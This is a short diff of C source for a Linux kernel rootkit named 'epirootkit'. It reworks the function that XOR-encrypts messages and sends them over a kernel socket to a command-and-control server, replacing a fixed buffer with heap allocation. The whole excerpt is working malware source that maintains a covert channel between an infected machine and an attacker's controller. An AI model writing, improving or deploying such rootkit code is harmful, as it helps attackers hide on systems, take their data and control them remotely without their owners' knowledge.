@@ -85,27 +85,37 @@ static int connect_to_c2_server(void) {
 static int send_to_c2(const char *msg, size_t len) {
     struct kvec iov;
     struct msghdr msg_hdr = {0};
-    int sent;
-    char encrypted[2048];
-    int i;
+    char *encrypted;
+    int sent, i;
 
     if (!g_sock) {
-        printk(KERN_ERR "epirootkit: Not connected, cannot send\n");
+        pr_err("epirootkit: Not connected, cannot send\n");
         return -ENOTCONN;
     }
 
-    // Encrypt the message before sending
-    for (i = 0; i < len && i < sizeof(encrypted); i++) {
+    // Allocate encrypted buffer
+    encrypted = kmalloc(len, GFP_KERNEL);
+    if (!encrypted) {
+        pr_err("epirootkit: Failed to allocate memory for encrypted message\n");
+        return -ENOMEM;
+    }
+
+    // Encrypt the message
+    for (i = 0; i < len; i++) {
         encrypted[i] = msg[i] ^ config.xor_key[i % strlen(config.xor_key)];
     }
 
+    // Setup the message vector
     iov.iov_base = encrypted;
     iov.iov_len = len;
 
+    // Send the encrypted message
     sent = kernel_sendmsg(g_sock, &msg_hdr, &iov, 1, len);
     if (sent < 0) {
-        printk(KERN_ERR "epirootkit: Send failed (error %d)\n", sent);
+        pr_err("epirootkit: Send failed (error %d)\n", sent);
     }
+
+    kfree(encrypted);
     return sent;
 }
 
